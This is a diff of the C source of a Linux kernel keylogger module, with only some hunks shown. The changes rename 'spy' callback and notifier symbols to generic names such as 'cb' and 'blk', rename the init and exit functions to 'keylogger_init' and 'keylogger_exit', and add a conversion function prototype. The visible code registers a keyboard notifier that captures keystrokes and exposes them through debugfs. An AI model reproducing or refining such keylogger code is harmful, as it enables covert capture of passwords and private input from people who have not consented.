@@ -27,8 +27,10 @@ static struct dentry *subdir;
 static ssize_t keys_read(struct file *filp, char *buffer, size_t len, loff_t *offset);
 
 // Keyboard notifier callback function invoked on keyboard events
-static int spy_cb(struct notifier_block *nblock, unsigned long code, void *_param);
+static int cb(struct notifier_block *nblock, unsigned long code, void *_param);
 
+// Keycode-to-string function prototype to avoid the compiler warning
+void string_conv(int kode, int shifted, char *buffer, int sys); 
 
 // US keymap
 /*
@@ -88,8 +90,8 @@ static ssize_t keys_read(struct file *filp, char *buffer, size_t len, loff_t *of
 }
 
 // Keyboard notifier block
-static struct notifier_block spy_blk = {
-	.notifier_call = spy_cb,
+static struct notifier_block blk = {
+	.notifier_call = cb,
 };
 
 // Method keys_read
@@ -122,7 +124,7 @@ void string_conv(int kode, int shifted, char *buffer, int sys) {
 	} // switch statement
 } // Method string_conv
 
-int spy_cb(struct notifier_block *nblock,
+int cb(struct notifier_block *nblock,
 		  unsigned long code,
 		  void *_param)
 {
@@ -160,7 +162,7 @@ int spy_cb(struct notifier_block *nblock,
 }
 
 // Module initialization
-static int __init spy_init(void)
+static int __init keylogger_init(void)
 {
     if (codes < 0 || codes > 2)
         return -EINVAL;
@@ -177,16 +179,16 @@ static int __init spy_init(void)
         return -ENOENT;
     }
 
-    register_keyboard_notifier(&spy_blk);
+    register_keyboard_notifier(&blk);
     return 0;
 }
 
-static void __exit spy_exit(void)
+static void __exit keylogger_exit(void)
 {
-    unregister_keyboard_notifier(&spy_blk);
+    unregister_keyboard_notifier(&blk);
     debugfs_remove_recursive(subdir);
 }
 
-module_init(spy_init);
-module_exit(spy_exit);
+module_init(keylogger_init);
+module_exit(keylogger_exit);
 
